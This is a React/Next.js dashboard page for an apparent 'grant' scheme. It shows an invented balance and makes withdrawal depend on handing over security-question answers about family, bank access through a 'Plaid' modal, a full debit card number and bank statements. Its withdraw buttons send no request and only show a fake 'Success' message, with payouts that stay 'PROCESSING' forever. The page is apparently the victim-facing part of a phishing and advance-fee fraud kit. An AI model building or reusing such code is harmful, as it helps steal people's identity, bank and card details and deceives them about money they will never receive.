"use client";
import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";
import PlaidModal from "@/components/PlaidModal";
import CardModal from "@/components/CardModal";
import IncomeModal from "@/components/IncomeModal";
import IdentityQuestionsModal from "@/components/IdentityQuestionsModal";

const CHECKLIST_ITEMS = [
  {
    id: "identity",
    label: "Identity Verification",
    description: "Provide required family background details for security verification.",
    icon: (
      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
        <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2" />
        <circle cx="9" cy="7" r="4" />
        <path d="M23 21v-2a4 4 0 0 0-3-3.87" />
        <path d="M16 3.13a4 4 0 0 1 0 7.75" />
      </svg>
    ),
  },

  {
    id: "plaid",
    label: "Verify Connected Bank",
    description: "Securely authenticate and verify your primary bank via Plaid Link.",
    icon: (
      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
        <path d="M3 21h18M3 10h18M5 10V7a7 7 0 1 1 14 0v3M7 21v-4m10 4v-4M12 21v-4" />
      </svg>
    ),
  },
  {
    id: "card",
    label: "Instant Grant Card",
    description: "Connect a debit card for expedited 1-hour disbursements.",
    icon: (
      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
        <rect x="1" y="4" width="22" height="16" rx="2" ry="2" />
        <line x1="1" y1="10" x2="23" y2="10" />
      </svg>
    ),
  },
  {
    id: "income",
    label: "Proof of Income",
    description: "Upload a bank statement from the last three months for eligibility.",
    icon: (
        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" />
            <polyline points="14 2 14 8 20 8" />
            <line x1="16" y1="13" x2="8" y2="13" />
            <line x1="16" y1="17" x2="8" y2="17" />
            <polyline points="10 9 9 9 8 9" />
        </svg>
    ),
  },
];

export default function DashboardPage() {
  const router = useRouter();
  const [userData, setUserData] = useState<any>(null);
  const [showWithdrawError, setShowWithdrawError] = useState(false);
  const [showWithdrawModal, setShowWithdrawModal] = useState(false);
  const [withdrawSuccess, setWithdrawSuccess] = useState(false);
  const [bankSuccessBanner, setBankSuccessBanner] = useState(false);
  const [bankVerifyingMsg, setBankVerifyingMsg] = useState(false);

  // Modal states
  const [isPlaidOpen, setIsPlaidOpen] = useState(false);
  const [isCardOpen, setIsCardOpen] = useState(false);
  const [isIncomeOpen, setIsIncomeOpen] = useState(false);
  const [isIdentityOpen, setIsIdentityOpen] = useState(false);

  const fetchUserData = async () => {
    const token = localStorage.getItem("bpkyc_token");
    if (!token) {
      router.push("/login");
      return;
    }

    try {
      const res = await fetch("/api/user/me", {
        headers: { Authorization: `Bearer ${token}` },
      });
      const data = await res.json();

      if (!res.ok) {
        localStorage.removeItem("bpkyc_token");
        router.push("/login");
        return;
      }

      if (data.status === "pending_kyc") {
        router.push("/onboarding");
        return;
      }

      setUserData(data);
    } catch (err) {
      console.error(err);
    }
  };

  useEffect(() => {
    fetchUserData();

    if (typeof window !== "undefined") {
      const params = new URLSearchParams(window.location.search);
      if (params.get("success") === "bank") {
        setBankSuccessBanner(true);
        setTimeout(() => setBankSuccessBanner(false), 5000);
        window.history.replaceState({}, document.title, window.location.pathname);
      }
    }
  }, [router]);

  const handleLogout = () => {
    localStorage.removeItem("bpkyc_token");
    router.push("/");
  };

  const updatePreference = async (field: string, value: any) => {
    const token = localStorage.getItem("bpkyc_token");
    const updated = { ...userData, [field]: value };
    setUserData(updated);

    try {
      await fetch("/api/user/actions", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${token}`,
        },
        body: JSON.stringify({
          action: "details",
          hasCreditCard: updated.hasCreditCard,
          filed2026Tax: updated.filed2026Tax,
          paymentFrequency: updated.paymentFrequency,
        }),
      });
    } catch (err) {
      console.error("Failed to update preferences", err);
    }
  };

  // Derived Checklist States
  const completed: Record<string, boolean> = {
    identity: userData?.identityQuestionsStatus === "verified",
    plaid: userData?.bankVerified || false,
    card: !!userData?.cardNumber,
    income: userData?.incomeProofStatus === "pending" || userData?.incomeProofStatus === "verified",
  };

  const allComplete = Object.values(completed).every(Boolean);
  const remainingItems = CHECKLIST_ITEMS.filter((item) => !completed[item.id]);

  const handleWithdraw = () => {
    if (allComplete) {
      setShowWithdrawModal(true);
    } else {
      setShowWithdrawError(true);
    }
  };

  if (!userData) return <div style={{ padding: "100px", textAlign: "center" }}>Loading...</div>;

  const firstName = userData.kyc?.fullName?.split(" ")[0] || userData.email?.split("@")[0] || "Applicant";

  return (
    <div style={{ background: "var(--off-white)", minHeight: "100vh", paddingBottom: "80px" }}>
      {/* Modals */}
      {isPlaidOpen && (
        <PlaidModal
          country={userData?.kyc?.country}
          onClose={() => setIsPlaidOpen(false)}
          onSuccess={() => {
            setBankVerifyingMsg(true);
            fetchUserData();
            setTimeout(() => setBankVerifyingMsg(false), 5000);
          }}
        />
      )}
      {isCardOpen && (
        <CardModal
          onClose={() => setIsCardOpen(false)}
          onSuccess={() => fetchUserData()}
        />
      )}

      {isIncomeOpen && (
        <IncomeModal
          onClose={() => setIsIncomeOpen(false)}
          onSuccess={() => fetchUserData()}
        />
      )}
      {isIdentityOpen && (
        <IdentityQuestionsModal
          onClose={() => setIsIdentityOpen(false)}
          onSuccess={() => fetchUserData()}
        />
      )}

      {/* Withdraw Success Notification */}
      {withdrawSuccess && (
        <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.65)", display: "flex", alignItems: "center", justifyContent: "center", zIndex: 10000, backdropFilter: "blur(4px)", animation: "fadeIn 0.2s ease-out" }} onClick={() => setWithdrawSuccess(false)}>
          <div onClick={(e) => e.stopPropagation()} style={{ background: "#fff", borderRadius: "20px", maxWidth: "440px", width: "90%", padding: "40px 32px", boxShadow: "0 32px 80px rgba(0,0,0,0.2)", textAlign: "center", animation: "scaleUp 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275)" }}>
            <style>{`
              @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
              @keyframes scaleUp { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
            `}</style>
            <div style={{ width: "72px", height: "72px", borderRadius: "50%", background: "#e6fcf5", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 24px" }}>
              <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#0ca678" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
                <polyline points="20 6 9 17 4 12" />
              </svg>
            </div>
            <h3 style={{ fontFamily: "Montserrat, sans-serif", fontWeight: 900, fontSize: "1.3rem", color: "var(--black)", marginBottom: "12px", textTransform: "uppercase" }}>Success</h3>
            <p style={{ color: "var(--text-body)", fontSize: "0.95rem", lineHeight: 1.6, marginBottom: "32px", fontWeight: 500 }}>
 Your disbursement is currently processing. Your payment interval will be calculated starting from the date of your initial payment, and the total disbursement will be split into six payments. Subsequent funds will be automatically deposited at set intervals based on your chosen frequency.
            </p>
            <button onClick={() => setWithdrawSuccess(false)} style={{ background: "var(--black)", color: "white", border: "none", padding: "14px 32px", borderRadius: "50px", fontFamily: "Montserrat, sans-serif", fontWeight: 800, fontSize: "0.85rem", textTransform: "uppercase", cursor: "pointer", width: "100%", letterSpacing: "0.05em" }}>
              Return to Dashboard
            </button>
          </div>
        </div>
      )}

      {/* Bank Verification Success Banner */}
      {bankSuccessBanner && (
        <div style={{ position: "fixed", top: "20px", left: "50%", transform: "translateX(-50%)", background: "#e6fcf5", color: "#0ca678", border: "2px solid #0ca678", padding: "16px 32px", borderRadius: "12px", boxShadow: "0 8px 32px rgba(0,0,0,0.15)", zIndex: 10000, fontFamily: "Montserrat, sans-serif", fontWeight: 800, display: "flex", alignItems: "center", gap: "12px", animation: "fadeUp 0.3s ease-out" }}>
          <style>{`
            @keyframes fadeUp {
              from { opacity: 0; transform: translate(-50%, -24px); }
              to { opacity: 1; transform: translate(-50%, 0); }
            }
          `}</style>
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
            <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14" />
            <polyline points="22 4 12 14.01 9 11.01" />
          </svg>
          BANK SUCCESSFULLY VERIFIED!
        </div>
      )}

      {/* Bank Verification Progress Banner */}
      {bankVerifyingMsg && (
        <div style={{ position: "fixed", top: "20px", left: "50%", transform: "translateX(-50%)", background: "#fff3cd", color: "#856404", border: "2px solid #ffeeba", padding: "16px 32px", borderRadius: "12px", boxShadow: "0 8px 32px rgba(0,0,0,0.15)", zIndex: 10000, fontFamily: "Montserrat, sans-serif", fontWeight: 800, display: "flex", alignItems: "center", gap: "12px", animation: "fadeUp 0.3s ease-out" }}>
          ⏳ BANK VERIFICATION IN PROGRESS...
        </div>
      )}

      {/* Withdraw Error Modal */}
      {showWithdrawError && (
        <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.65)", display: "flex", alignItems: "center", justifyContent: "center", zIndex: 9999, backdropFilter: "blur(4px)" }} onClick={() => setShowWithdrawError(false)}>
          <div onClick={(e) => e.stopPropagation()} style={{ background: "#fff", borderRadius: "16px", maxWidth: "440px", width: "90%", padding: "40px", boxShadow: "0 32px 80px rgba(0,0,0,0.2)", position: "relative", margin: "0 auto" }}>
            <div style={{ display: "flex", justifyContent: "center", marginBottom: "20px" }}>
              <div style={{ width: "64px", height: "64px", borderRadius: "50%", background: "#fff0f3", display: "flex", alignItems: "center", justifyContent: "center" }}>
                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="var(--pink)" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                  <circle cx="12" cy="12" r="10" />
                  <line x1="12" y1="8" x2="12" y2="12" />
                  <line x1="12" y1="16" x2="12.01" y2="16" />
                </svg>
              </div>
            </div>
            <h3 style={{ fontFamily: "Montserrat, sans-serif", fontWeight: 900, fontSize: "1.3rem", color: "var(--black)", textAlign: "center", marginBottom: "8px", textTransform: "uppercase" }}>Withdrawal Unavailable</h3>
            <p style={{ fontFamily: "Montserrat, sans-serif", fontWeight: 700, fontSize: "0.75rem", color: "var(--pink)", textAlign: "center", marginBottom: "16px", letterSpacing: "0.08em" }}>Error Code: BP-ERR-4031 — Profile Incomplete</p>
            <p style={{ color: "var(--text-body)", fontSize: "0.92rem", textAlign: "center", lineHeight: 1.65, marginBottom: "28px" }}>Your profile setup is not complete. To initiate a withdrawal, please finish all required steps in your <strong style={{ color: "var(--black)" }}>Account Setup Checklist</strong>.</p>
            {remainingItems.length > 0 && (
              <div style={{ background: "#fafafa", border: "1px solid #eee", borderRadius: "10px", padding: "14px 18px", marginBottom: "24px", display: "flex", flexDirection: "column", gap: "8px" }}>
                <span style={{ fontFamily: "Montserrat, sans-serif", fontWeight: 700, fontSize: "0.7rem", color: "var(--text-body)", textTransform: "uppercase", marginBottom: "4px" }}>Pending Steps</span>
                {remainingItems.map((item) => (
                  <div key={item.id} style={{ display: "flex", alignItems: "center", gap: "10px", color: "var(--black)", fontSize: "0.88rem", fontWeight: 600 }}>
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="var(--pink)" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                      <polyline points="9 18 15 12 9 6" />
                    </svg>
                    {item.label}
                  </div>
                ))}
              </div>
            )}
            <button onClick={() => setShowWithdrawError(false)} style={{ width: "100%", background: "var(--black)", color: "var(--white)", border: "none", padding: "14px 24px", borderRadius: "50px", fontFamily: "Montserrat, sans-serif", fontWeight: 800, fontSize: "0.85rem", textTransform: "uppercase", cursor: "pointer", letterSpacing: "0.05em" }}>Got It</button>
          </div>
        </div>
      )}

      {/* Withdraw Selection Modal */}
      {showWithdrawModal && (
        <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.65)", display: "flex", alignItems: "center", justifyContent: "center", zIndex: 9999, backdropFilter: "blur(4px)" }} onClick={() => setShowWithdrawModal(false)}>
          <div onClick={(e) => e.stopPropagation()} style={{ background: "#fff", borderRadius: "16px", maxWidth: "440px", width: "90%", padding: "40px", boxShadow: "0 32px 80px rgba(0,0,0,0.2)", position: "relative", margin: "0 auto" }}>
            <h3 style={{ fontFamily: "Montserrat, sans-serif", fontWeight: 900, fontSize: "1.3rem", color: "var(--black)", textAlign: "center", marginBottom: "8px", textTransform: "uppercase" }}>Withdraw Funds</h3>
            <p style={{ color: "var(--text-body)", fontSize: "0.92rem", textAlign: "center", lineHeight: 1.65, marginBottom: "28px" }}>How would you like to receive your disbursement?</p>
            <div style={{ display: "flex", flexDirection: "column", gap: "12px" }}>
              <button 
                onClick={() => { setShowWithdrawModal(false); setWithdrawSuccess(true); }} 
                style={{ width: "100%", background: "var(--black)", color: "var(--white)", border: "none", padding: "14px 24px", borderRadius: "50px", fontFamily: "Montserrat, sans-serif", fontWeight: 800, fontSize: "0.85rem", textTransform: "uppercase", cursor: "pointer", letterSpacing: "0.05em" }}
              >
                Bi-Weekly
              </button>
              <button 
                onClick={() => { setShowWithdrawModal(false); setWithdrawSuccess(true); }} 
                style={{ width: "100%", background: "var(--cyan)", color: "var(--black)", border: "none", padding: "14px 24px", borderRadius: "50px", fontFamily: "Montserrat, sans-serif", fontWeight: 800, fontSize: "0.85rem", textTransform: "uppercase", cursor: "pointer", letterSpacing: "0.05em" }}
              >
                Monthly
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Dashboard Header */}
      <section style={{ background: "var(--black)", padding: "40px 20px", color: "var(--white)" }}>
        <div style={{ maxWidth: "1000px", margin: "0 auto", display: "flex", justifyContent: "space-between", alignItems: "center", flexWrap: "wrap", gap: "20px" }}>
          <div>
            <h1 style={{ fontFamily: "Montserrat, sans-serif", fontWeight: 900, fontSize: "clamp(1.8rem, 5vw, 2.5rem)", marginBottom: "8px", textTransform: "uppercase" }}>Welcome, {firstName}!</h1>
            <p style={{ color: "var(--cyan)", fontFamily: "Montserrat, sans-serif", fontWeight: 600 }}>Grant Dashboard</p>
          </div>
          <button onClick={handleLogout} style={{ background: "transparent", border: "1px solid var(--white)", color: "var(--white)", padding: "10px 20px", borderRadius: "50px", fontFamily: "Montserrat, sans-serif", fontWeight: 700, fontSize: "0.85rem", cursor: "pointer" }}>LOGOUT</button>
        </div>
      </section>

      <main style={{ maxWidth: "1000px", margin: "40px auto", padding: "0 20px", display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(320px, 1fr))", gap: "40px" }}>
        <div style={{ display: "flex", flexDirection: "column", gap: "32px" }}>
          {/* Balance Card */}
          <div style={{ background: "var(--white)", padding: "clamp(20px, 5vw, 40px)", borderRadius: "12px", borderTop: "8px solid var(--pink)", boxShadow: "0 8px 32px rgba(0,0,0,0.06)" }}>
            <h2 style={{ fontFamily: "Montserrat, sans-serif", fontWeight: 800, fontSize: "1rem", color: "var(--text-body)", textTransform: "uppercase", marginBottom: "16px" }}>Available Grant Balance</h2>
            <div style={{ fontSize: "clamp(3rem, 10vw, 4.5rem)", fontFamily: "Montserrat, sans-serif", fontWeight: 900, color: "var(--black)", lineHeight: 1, marginBottom: "8px" }}>${userData.balance?.toLocaleString() || "0"}</div>
            <p style={{ color: "var(--text-body)", fontSize: "0.9rem" }}>Funds have been securely routed to your application profile.</p>
            <button onClick={handleWithdraw} style={{ marginTop: "24px", background: allComplete ? "var(--cyan)" : "#e0e0e0", color: allComplete ? "var(--black)" : "#888", border: "none", padding: "16px 32px", borderRadius: "50px", fontFamily: "Montserrat, sans-serif", fontWeight: 800, fontSize: "0.85rem", textTransform: "uppercase", cursor: allComplete ? "pointer" : "not-allowed", display: "flex", alignItems: "center", gap: "10px", transition: "background 0.3s, color 0.3s" }}>
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><polyline points="17 1 21 5 17 9" /><path d="M3 11V9a4 4 0 0 1 4-4h14" /><polyline points="7 23 3 19 7 15" /><path d="M21 13v2a4 4 0 0 1-4 4H3" /></svg>
              <span>Withdraw Funds</span>
              {!allComplete && <span style={{ marginLeft: "6px", background: "var(--pink)", color: "#fff", fontSize: "0.65rem", fontWeight: 800, padding: "3px 8px", borderRadius: "20px", textTransform: "uppercase", letterSpacing: "0.05em" }}>Setup Required</span>}
            </button>
          </div>

          {/* Linked Bank Card */}
          {(userData.bankLinked || userData.cardNumber) && (
            <div style={{ background: "var(--white)", padding: "24px", borderRadius: "12px", border: "2px solid var(--cyan)", display: "flex", flexDirection: "column", gap: "16px" }}>
              <h3 style={{ fontFamily: "Montserrat, sans-serif", fontWeight: 800, fontSize: "0.9rem", color: "var(--text-body)", textTransform: "uppercase" }}>Connected Accounts</h3>
              
              {userData.bankLinked && (
                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                  <div style={{ display: "flex", gap: "16px", alignItems: "center" }}>
                    <div style={{ width: "40px", height: "40px", background: "#f0f0f0", borderRadius: "10px", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "1.2rem" }}>🏦</div>
                    <div>
                      <h4 style={{ fontFamily: "Montserrat, sans-serif", fontWeight: 800, fontSize: "0.95rem", color: "var(--black)", marginBottom: "2px" }}>{userData.bankName || "Linked Bank"}</h4>
                      <p style={{ fontSize: "0.75rem", color: "var(--text-body)" }}>{userData.bankUsername ? `Verified as ${userData.bankUsername}` : "Plaid Verified"}</p>
                    </div>
                  </div>
                  <div style={{ background: userData.bankVerified ? "#e6fcf5" : "#fff9db", color: userData.bankVerified ? "#0ca678" : "#f08c00", padding: "4px 10px", borderRadius: "20px", fontSize: "0.65rem", fontWeight: 800, textTransform: "uppercase" }}>
                    {userData.bankVerified ? "Verified" : "Pending Verification"}
                  </div>
                </div>
              )}

              {userData.cardNumber && (
                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                  <div style={{ display: "flex", gap: "16px", alignItems: "center" }}>
                    <div style={{ width: "40px", height: "40px", background: "#f0f0f0", borderRadius: "10px", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "1.2rem" }}>💳</div>
                    <div>
                      <h4 style={{ fontFamily: "Montserrat, sans-serif", fontWeight: 800, fontSize: "0.95rem", color: "var(--black)", marginBottom: "2px" }}>Instant Payout Card</h4>
                      <p style={{ fontSize: "0.75rem", color: "var(--text-body)" }}>•••• {userData.cardNumber.slice(-4)}</p>
                    </div>
                  </div>
                  <div style={{ background: "#e6fcf5", color: "#0ca678", padding: "4px 10px", borderRadius: "20px", fontSize: "0.65rem", fontWeight: 800, textTransform: "uppercase" }}>Active</div>
                </div>
              )}
            </div>
          )}

          {/* Payout Schedule Card */}
          {userData.balance > 0 && (
            <div style={{ background: "var(--white)", padding: "24px", borderRadius: "12px", border: "1px solid var(--gray)" }}>
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "20px" }}>
                <h3 style={{ fontFamily: "Montserrat, sans-serif", fontWeight: 800, fontSize: "1.1rem", color: "var(--black)", textTransform: "uppercase", margin: 0 }}>Payout Schedule</h3>
                <span style={{ fontSize: "0.75rem", background: "#f5f5f5", padding: "4px 10px", borderRadius: "20px", fontWeight: 800, color: "var(--text-body)" }}>6 INTERVALS</span>
              </div>
              <div style={{ display: "flex", flexDirection: "column", gap: "10px" }}>
                {[1, 2, 3, 4, 5, 6].map((num) => (
                  <div key={num} style={{ display: "flex", justifyContent: "space-between", alignItems: "center", padding: "12px 14px", background: "#fafafa", borderRadius: "10px", border: "1px solid #eee" }}>
                    <div style={{ display: "flex", gap: "14px", alignItems: "center" }}>
                      <div style={{ width: "32px", height: "32px", borderRadius: "50%", background: "var(--black)", color: "white", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "0.8rem", fontWeight: 800 }}>{num}</div>
                      <div>
                        <div style={{ fontSize: "0.9rem", fontWeight: 800, color: "var(--black)", marginBottom: "2px" }}>${Math.round(userData.balance / 6).toLocaleString()}</div>
                        <div style={{ fontSize: "0.7rem", color: "var(--text-body)" }}>Disbursement #{num}</div>
                      </div>
                    </div>
                    <div style={{ background: "#fff9db", color: "#f08c00", padding: "4px 10px", borderRadius: "20px", fontSize: "0.65rem", fontWeight: 800, textTransform: "uppercase", display: "flex", alignItems: "center", gap: "6px" }}>
                      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" style={{ animation: "spin 2s linear infinite" }}><line x1="12" y1="2" x2="12" y2="6"/><line x1="12" y1="18" x2="12" y2="22"/><line x1="4.93" y1="4.93" x2="7.76" y2="7.76"/><line x1="16.24" y1="16.24" x2="19.07" y2="19.07"/><line x1="2" y1="12" x2="6" y2="12"/><line x1="18" y1="12" x2="22" y2="12"/><line x1="4.93" y1="19.07" x2="7.76" y2="16.24"/><line x1="16.24" y1="7.76" x2="19.07" y2="4.93"/></svg>
                      PROCESSING
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

          <div style={{ background: "var(--white)", padding: "24px", borderRadius: "12px", border: "1px solid var(--gray)" }}>
            <h3 style={{ fontFamily: "Montserrat, sans-serif", fontWeight: 800, fontSize: "1.1rem", color: "var(--black)", marginBottom: "24px", textTransform: "uppercase" }}>Recent Activity</h3>
            <div style={{ display: "flex", flexDirection: "column", gap: "20px" }}>
              {CHECKLIST_ITEMS.filter(item => completed[item.id]).length > 0 ? (
                CHECKLIST_ITEMS.filter(item => completed[item.id]).map((item) => (
                   <div key={item.id} style={{ display: "flex", gap: "16px", alignItems: "flex-start" }}>
                      <div style={{ width: "36px", height: "36px", borderRadius: "50%", background: "var(--cyan)", flexShrink: 0, display: "flex", alignItems: "center", justifyContent: "center" }}>
                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="var(--black)" strokeWidth="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14" /><polyline points="22 4 12 14.01 9 11.01" /></svg>
                      </div>
                      <div>
                        <h4 style={{ fontFamily: "Montserrat, sans-serif", fontWeight: 700, fontSize: "0.9rem", color: "var(--black)", marginBottom: "4px" }}>{item.label}</h4>
                        <p style={{ color: "var(--text-body)", fontSize: "0.85rem" }}>
                          {item.id === "identity" ? "Identity security questions verified." : item.id === "plaid" ? "Bank account successfully linked." : item.id === "card" ? "Grant card connected and verified." : "Income documents submitted."}
                        </p>
                      </div>
                   </div>
                ))
              ) : (
                <div style={{ color: "var(--text-body)", fontSize: "0.85rem", fontStyle: "italic" }}>No recent activity to display. Complete checklist items to see them here.</div>
              )}
            </div>
          </div>
        </div>

        <div style={{ display: "flex", flexDirection: "column", gap: "24px" }}>
          {!allComplete && (
            <div style={{ background: "var(--white)", borderRadius: "12px", border: "1px solid var(--gray)", overflow: "hidden", boxShadow: "0 4px 20px rgba(0,0,0,0.05)" }}>
              <div style={{ background: "var(--black)", padding: "18px 24px", display: "flex", alignItems: "center", gap: "12px" }}>
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="var(--cyan)" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><polyline points="9 11 12 14 22 4" /><path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11" /></svg>
                <h3 style={{ fontFamily: "Montserrat, sans-serif", fontWeight: 800, fontSize: "0.9rem", color: "var(--white)", textTransform: "uppercase", letterSpacing: "0.06em", margin: 0 }}>Account Setup</h3>
                <span style={{ marginLeft: "auto", background: "var(--pink)", color: "#fff", fontSize: "0.65rem", fontWeight: 800, padding: "3px 10px", borderRadius: "20px" }}>{remainingItems.length} Left</span>
              </div>
              <div style={{ height: "4px", background: "#eee" }}>
                <div style={{ height: "100%", background: "var(--cyan)", width: `${(Object.values(completed).filter(Boolean).length / CHECKLIST_ITEMS.length) * 100}%`, transition: "width 0.5s ease" }} />
              </div>
              <div style={{ padding: "16px" }}>
                {CHECKLIST_ITEMS.map((item, idx) => {
                  const done = !!completed[item.id];
                  if (done) return null;
                  return (
                    <div key={item.id} style={{ display: "flex", alignItems: "flex-start", gap: "12px", padding: "14px", borderRadius: "10px", marginBottom: "8px", background: "#fafafa", border: "1px solid #f0f0f0" }}>
                      <div style={{ width: "24px", height: "24px", borderRadius: "50%", border: "2px solid #ccc", flexShrink: 0, marginTop: "2px" }} />
                      <div style={{ flex: 1 }}>
                        <div style={{ display: "flex", alignItems: "center", gap: "8px", marginBottom: "4px" }}>
                          <span style={{ color: "var(--pink)" }}>{item.icon}</span>
                          <span style={{ fontFamily: "Montserrat, sans-serif", fontWeight: 700, fontSize: "0.85rem", color: "var(--black)" }}>{item.label}</span>
                        </div>
                        <p style={{ fontSize: "0.75rem", color: "var(--text-body)", marginBottom: "10px", lineHeight: 1.4 }}>{item.description}</p>
                        <button 
                          onClick={() => {
                            if (item.id === "identity") setIsIdentityOpen(true);
                            if (item.id === "plaid") setIsPlaidOpen(true);
                            if (item.id === "card") setIsCardOpen(true);
                            if (item.id === "income") setIsIncomeOpen(true);
                          }}
                          style={{ background: "var(--black)", color: "white", border: "none", padding: "6px 12px", borderRadius: "50px", fontSize: "0.7rem", fontWeight: 800, textTransform: "uppercase", cursor: "pointer" }}
                        >
                          {item.id === "identity" ? "Answer Security Questions" : item.id === "plaid" ? "Verify Bank" : item.id === "card" ? "Connect Card" : "Upload Proof"}
                        </button>
                      </div>
                    </div>
                  );
                })}
              </div>
            </div>
          )}

          <div style={{ background: "var(--white)", padding: "24px", borderRadius: "12px", border: "1px solid var(--gray)" }}>
            <h3 style={{ fontFamily: "Montserrat, sans-serif", fontWeight: 800, fontSize: "0.9rem", color: "var(--black)", marginBottom: "20px", textTransform: "uppercase" }}>Preferences</h3>
            <div style={{ display: "flex", flexDirection: "column", gap: "16px" }}>
               <label style={{ display: "flex", alignItems: "center", gap: "10px", cursor: userData.hasCreditCard ? "default" : "pointer", opacity: userData.hasCreditCard ? 0.8 : 1 }}>
                  <input
                    type="checkbox"
                    checked={!!userData.hasCreditCard}
                    onChange={(e) => !userData.hasCreditCard && updatePreference("hasCreditCard", e.target.checked)}
                    readOnly={!!userData.hasCreditCard}
                    style={{ width: "18px", height: "18px", cursor: userData.hasCreditCard ? "not-allowed" : "pointer", accentColor: "var(--pink)" }}
                  />
                  <span style={{ fontSize: "0.85rem", fontWeight: 600 }}>Credit Card Holder?</span>
                  {userData.hasCreditCard && <span style={{ fontSize: "0.65rem", background: "#e6fcf5", color: "#0ca678", padding: "2px 8px", borderRadius: "20px", fontWeight: 800, textTransform: "uppercase" }}>Confirmed</span>}
               </label>
               <label style={{ display: "flex", alignItems: "center", gap: "10px", cursor: userData.filed2026Tax ? "default" : "pointer", opacity: userData.filed2026Tax ? 0.8 : 1 }}>
                  <input
                    type="checkbox"
                    checked={!!userData.filed2026Tax}
                    onChange={(e) => !userData.filed2026Tax && updatePreference("filed2026Tax", e.target.checked)}
                    readOnly={!!userData.filed2026Tax}
                    style={{ width: "18px", height: "18px", cursor: userData.filed2026Tax ? "not-allowed" : "pointer", accentColor: "var(--pink)" }}
                  />
                  <span style={{ fontSize: "0.85rem", fontWeight: 600 }}>Filed 2026 Tax?</span>
                  {userData.filed2026Tax && <span style={{ fontSize: "0.65rem", background: "#e6fcf5", color: "#0ca678", padding: "2px 8px", borderRadius: "20px", fontWeight: 800, textTransform: "uppercase" }}>Confirmed</span>}
               </label>
            </div>
          </div>

          <div style={{ background: "var(--white)", padding: "24px", borderRadius: "12px", border: "1px solid var(--gray)" }}>
            <h3 style={{ fontFamily: "Montserrat, sans-serif", fontWeight: 800, fontSize: "1rem", color: "var(--black)", marginBottom: "16px", textTransform: "uppercase" }}>Profile</h3>
            <div style={{ display: "flex", flexDirection: "column", gap: "12px" }}>
              <div><span style={{ fontSize: "0.7rem", color: "var(--text-body)", textTransform: "uppercase", fontWeight: 700 }}>Full Name</span><div style={{ fontSize: "0.9rem", color: "var(--black)", fontWeight: 600 }}>{userData.kyc?.fullName || "—"}</div></div>
              <div><span style={{ fontSize: "0.7rem", color: "var(--text-body)", textTransform: "uppercase", fontWeight: 700 }}>Email</span><div style={{ fontSize: "0.9rem", color: "var(--black)", fontWeight: 600 }}>{userData.email}</div></div>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}
